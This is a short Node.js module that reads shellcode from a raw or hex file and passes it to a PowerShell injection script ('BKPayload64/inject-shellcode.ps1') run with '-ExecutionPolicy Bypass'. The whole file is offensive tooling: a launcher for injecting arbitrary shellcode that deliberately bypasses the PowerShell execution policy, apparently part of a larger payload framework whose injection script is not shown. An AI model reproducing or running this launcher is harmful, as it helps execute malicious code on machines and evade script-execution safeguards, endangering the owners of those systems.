'use strict';
const { spawnSync } = require('child_process');
const fs = require('fs');
const path = require('path');

function parseShellcodeFile(filePath) {
    const ext = path.extname(filePath).toLowerCase();
    const data = fs.readFileSync(filePath);
    if (ext === '.hex') {
        return data.toString('utf8').replace(/\s+/g, '').toLowerCase();
    }
    return data.toString('hex');
}

function execShellcode(filePath, opts = {}) {
    const spawnSyncImpl = opts.spawnSyncImpl || spawnSync;
    const hex = parseShellcodeFile(filePath);
    const psPath = opts.psPath || path.resolve(
        __dirname, '../../inject/BKPayload64/inject-shellcode.ps1'
    );
    const resultSize = opts.resultSize || 4096;
    const timeoutMs = opts.timeoutMs || 5000;

    const args = [
        '-ExecutionPolicy', 'Bypass',
        '-File', psPath,
        '-ShellcodeHex', hex,
        '-ResultSize', String(resultSize),
        '-TimeoutMs', String(timeoutMs),
    ];
    if (opts.noWait) args.push('-NoWait');

    const result = spawnSyncImpl('pwsh', args, { encoding: 'utf8', timeout: timeoutMs + 10000 });
    if (result.status !== 0) {
        throw new Error((result.stderr || result.stdout || 'shellcode injection failed').trim());
    }
    return (result.stdout || '').trim();
}

module.exports = { parseShellcodeFile, execShellcode };
